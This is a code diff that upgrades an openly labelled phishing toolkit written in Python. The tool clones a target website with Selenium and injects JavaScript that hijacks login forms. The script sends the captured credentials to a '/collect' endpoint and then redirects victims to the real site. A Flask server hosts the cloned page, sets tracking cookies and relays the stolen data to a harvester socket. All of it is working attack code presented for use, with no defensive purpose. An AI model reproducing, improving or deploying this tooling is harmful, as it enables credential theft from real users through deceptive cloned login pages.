@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Dark Genius Syndicate - Ultimate Phishing Toolkit
+# Dark Genius Syndicate - Ultimate Phishing Toolkit v4.0 (Enhanced)
 # Author: 0xR3b3l
 
 import os
@@ -15,30 +15,59 @@ import hashlib
 import base64
 import logging
 import threading
-from flask import Flask, request, render_template_string, redirect, send_from_directory
+import subprocess
+from flask import Flask, request, send_from_directory, make_response, jsonify, redirect
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
 from webdriver_manager.chrome import ChromeDriverManager
+from webdriver_manager.core.os_manager import ChromeType
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin, urlparse, urlunparse
 import atexit
 import mimetypes
 
 # Disable logging
 logging.basicConfig(level=logging.CRITICAL)
 
-# ========== PERFECT WEBSITE CLONER ==========
-class PerfectPhisher:
+# ========== ENHANCED WEBSITE CLONER ==========
+class AdvancedPhisher:
     def __init__(self, output_dir="cloned_site"):
         self.output_dir = output_dir
         self.target_url = ""
+        self.original_domain = ""
+        self.login_endpoint = ""
         self.driver = None
         self.asset_map = {}
         self.page_source = ""
+        self.login_form_info = {}
         
         # Create output directory
         os.makedirs(self.output_dir, exist_ok=True)
+        
+    def _get_browser_version(self):
+        """Get installed Chromium version"""
+        try:
+            # Try to get Chromium version
+            result = subprocess.check_output(['chromium', '--version'])
+            version_str = result.decode('utf-8').strip()
+            version_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', version_str)
+            if version_match:
+                return version_match.group(1)
+        except Exception:
+            pass
+        
+        try:
+            # Try Chrome as fallback
+            result = subprocess.check_output(['google-chrome', '--version'])
+            version_str = result.decode('utf-8').strip()
+            version_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', version_str)
+            if version_match:
+                return version_match.group(1)
+        except Exception:
+            pass
+        
+        return None
         
     def _init_browser(self):
         chrome_options = Options()
@@ -68,8 +97,20 @@ class PerfectPhisher:
         chrome_options.add_argument(f"user-agent={random.choice(user_agents)}")
         
         try:
+            # Get installed browser version
+            browser_version = self._get_browser_version()
+            
             # Automatic driver installation
-            service = Service(executable_path=ChromeDriverManager().install())
+            if browser_version:
+                print(f"[+] Detected Chromium version: {browser_version}")
+                major_version = browser_version.split('.')[0]
+                service = Service(
+                    ChromeDriverManager(version=major_version, chrome_type=ChromeType.CHROMIUM).install()
+                )
+            else:
+                print("[-] Using latest ChromeDriver")
+                service = Service(ChromeDriverManager().install())
+            
             self.driver = webdriver.Chrome(service=service, options=chrome_options)
             
             # Execute stealth scripts
@@ -78,7 +119,15 @@ class PerfectPhisher:
             return True
         except Exception as e:
             print(f"[-] Failed to initialize ChromeDriver: {str(e)}")
-            return False
+            # Fallback to system Chromium
+            try:
+                chrome_options.binary_location = '/usr/bin/chromium'
+                self.driver = webdriver.Chrome(options=chrome_options)
+                print("[+] Using system Chromium directly")
+                return True
+            except Exception as fallback_e:
+                print(f"[-] Fallback failed: {str(fallback_e)}")
+                return False
     
     def _download_asset(self, url):
         """Download and save an asset, return local path"""
@@ -110,66 +159,95 @@ class PerfectPhisher:
             pass
         return url
     
+    def _analyze_login_form(self, soup):
+        """Detect and record login form details"""
+        forms = soup.find_all('form')
+        for form in forms:
+            if form.find('input', {'type': 'password'}):
+                # Found likely login form
+                action = form.get('action', '')
+                method = form.get('method', 'GET').upper()
+                
+                # Store form details
+                self.login_form_info = {
+                    'action': urljoin(self.target_url, action),
+                    'method': method,
+                    'fields': {}
+                }
+                
+                # Identify input fields
+                inputs = form.find_all('input')
+                for input_tag in inputs:
+                    name = input_tag.get('name')
+                    if name:
+                        input_type = input_tag.get('type', 'text').lower()
+                        self.login_form_info['fields'][name] = input_type
+                
+                print(f"[+] Detected login form at: {self.login_form_info['action']}")
+                return True
+        return False
+
     def _inject_phishing_code(self, soup):
-        """Inject invisible phishing code into the page"""
+        """Inject phishing code to capture credentials without validation"""
         script = soup.new_tag('script')
         phishing_code = """
-        // Stealth form hijacking
+        // Basic phishing code to capture credentials
         document.addEventListener('DOMContentLoaded', function() {
-            function captureAndSubmit(form) {
-                var data = {};
-                var inputs = form.querySelectorAll('input, textarea, select');
+            // Error display element
+            const errorDisplay = document.createElement('div');
+            errorDisplay.id = 'loginError';
+            errorDisplay.style = 'color: red; padding: 10px; margin: 10px 0; border: 1px solid red; display: none;';
+            errorDisplay.textContent = 'Invalid credentials. Please try again.';
+            
+            // Find forms to attach error display
+            document.querySelectorAll('form').forEach(form => {
+                if (form.querySelector('input[type="password"]')) {
+                    form.parentNode.insertBefore(errorDisplay, form);
+                }
+            });
+            
+            // FORM HIJACKING - SIMPLE VERSION
+            async function captureAndSubmit(form) {
+                // Collect form data
+                const formData = new FormData(form);
+                const data = Object.fromEntries(formData.entries());
                 
-                inputs.forEach(function(input) {
-                    if (input.name && !input.type.match(/^submit|button$/i)) {
-                        data[input.name] = input.value;
-                    }
-                });
+                try {
+                    // Send credentials to our server
+                    await fetch('/collect', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(data)
+                    });
+                    
+                    // Redirect to real site after short delay
+                    setTimeout(() => {
+                        window.location.href = "%s";
+                    }, 1000);
+                    
+                } catch (error) {
+                    console.error('Capture error:', error);
+                    errorDisplay.textContent = 'Submission failed. Please try again.';
+                    errorDisplay.style.display = 'block';
+                }
                 
-                // Send to our server silently
-                fetch('/collect', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data),
-                    keepalive: true
-                });
-                
-                return true;
+                return false; // Prevent default form submission
             }
             
             // Hijack all existing forms
             document.querySelectorAll('form').forEach(function(form) {
-                form.onsubmit = function() {
-                    return captureAndSubmit(this);
-                };
-            });
-            
-            // Monitor for new forms (dynamic content)
-            var observer = new MutationObserver(function(mutations) {
-                mutations.forEach(function(mutation) {
-                    mutation.addedNodes.forEach(function(node) {
-                        if (node.nodeName === 'FORM') {
-                            node.onsubmit = function() {
-                                return captureAndSubmit(this);
-                            };
-                        } else if (node.querySelectorAll) {
-                            node.querySelectorAll('form').forEach(function(form) {
-                                form.onsubmit = function() {
-                                    return captureAndSubmit(this);
-                                };
-                            });
-                        }
-                    });
-                });
-            });
-            
-            observer.observe(document.body, {
-                childList: true,
-                subtree: true
+                if (form.querySelector('input[type="password"]')) {
+                    form.onsubmit = function(e) {
+                        e.preventDefault();
+                        return captureAndSubmit(this);
+                    };
+                }
             });
         });
-        """
+        """ % self.target_url
+        
         script.string = phishing_code
+        
         if soup.head:
             soup.head.append(script)
         else:
@@ -179,12 +257,12 @@ class PerfectPhisher:
     
     def clone_site(self):
         try:
-            if not self.driver:
-                if not self._init_browser():
-                    return False
+            if not self._init_browser():
+                return False
             
             print(f"[+] Navigating to: {self.target_url}")
             self.driver.get(self.target_url)
+            self.original_domain = urlparse(self.target_url).netloc
             
             # Simulate human behavior
             time.sleep(random.uniform(2, 5))
@@ -198,6 +276,9 @@ class PerfectPhisher:
             # Get page source after JavaScript execution
             self.page_source = self.driver.page_source
             soup = BeautifulSoup(self.page_source, 'html.parser')
+            
+            # Detect and analyze login form
+            self._analyze_login_form(soup)
             
             print("[+] Processing assets...")
             # Find and download all assets
@@ -242,13 +323,13 @@ class PerfectPhisher:
                                 new_urls.append(url)
                         
                         if attr == 'srcset':
-                            tag[attr] = ', '.join([f"{url} {source.split(' ')[1]}" for url, source in zip(new_urls, srcset)])
+                            tag[attr] = ', '.join([f"{url} {source.split(' ')[1]}" for url, source in zip(new_urls, srcset) if len(source.split(' ')) > 1])
                         else:
                             tag[attr] = new_urls[0]
             
             # Inject phishing code
             self._inject_phishing_code(soup)
-            print("[+] Phishing scripts injected")
+            print("[+] Basic phishing script injected")
             
             # Save main page
             main_page = os.path.join(self.output_dir, "index.html")
@@ -264,8 +345,8 @@ class PerfectPhisher:
             if self.driver:
                 self.driver.quit()
 
-# ========== PERFECT PHISHING SERVER ==========
-class PerfectPhishingServer:
+# ========== ENHANCED PHISHING SERVER ==========
+class AdvancedPhishingServer:
     def __init__(self, port=5000, data_port=5001, site_dir="cloned_site"):
         self.port = port
         self.data_port = data_port
@@ -318,7 +399,15 @@ class PerfectPhishingServer:
     
     def serve_index(self):
         """Serve the main index page"""
-        return send_from_directory(self.site_dir, 'index.html')
+        # Set session cookie for tracking
+        resp = make_response(send_from_directory(self.site_dir, 'index.html'))
+        
+        # Check if user has visited before
+        if not request.cookies.get('visitor_id'):
+            visitor_id = hashlib.sha256(os.urandom(16)).hexdigest()
+            resp.set_cookie('visitor_id', visitor_id, max_age=60*60*24*365)  # 1 year
+            
+        return resp
     
     def serve_static(self, path):
         """Serve static assets with proper mimetypes"""
@@ -353,7 +442,6 @@ class PerfectPhishingServer:
             harvester_socket.sendall(json.dumps(data_package).encode())
             harvester_socket.close()
             
-            # Return success response to prevent errors
             return json.dumps({'status': 'success'}), 200
         except Exception as e:
             print(f"[-] Data collection error: {str(e)}")
@@ -365,7 +453,7 @@ class PerfectPhishingServer:
         self.start_data_harvester()
         
         # Start Flask server
-        print(f"[+] Starting phishing server on port {self.port}")
+        print(f"[+] Starting basic phishing server on port {self.port}")
         print(f"[+] Cloned site available at: http://localhost:{self.port}")
         self.app.run(host='0.0.0.0', port=self.port, threaded=True)
 
@@ -390,8 +478,8 @@ def main():
         target_url = 'https://' + target_url
     
     # Clone the target website
-    print("\n[+] Cloning target website with pixel-perfect accuracy...")
-    phisher = PerfectPhisher("cloned_site")
+    print("\n[+] Cloning target website...")
+    phisher = AdvancedPhisher("cloned_site")
     phisher.target_url = target_url
     
     if not phisher.clone_site():
@@ -399,15 +487,16 @@ def main():
         return
     
     # Start phishing server
-    print("\n[+] Starting perfect phishing server...")
-    server = PerfectPhishingServer(site_dir="cloned_site")
+    print("\n[+] Starting phishing server...")
+    server = AdvancedPhishingServer(site_dir="cloned_site")
     server.run()
 
 if __name__ == "__main__":
     # Cleanup function to ensure ChromeDriver is killed
     def cleanup():
-        os.system("taskkill /f /im chromedriver.exe > nul 2>&1")
-        os.system("taskkill /f /im chrome.exe > nul 2>&1")
+        os.system("pkill chromedriver > /dev/null 2>&1")
+        os.system("pkill chrome > /dev/null 2>&1")
+        os.system("pkill chromium > /dev/null 2>&1")
     
     atexit.register(cleanup)
     main()
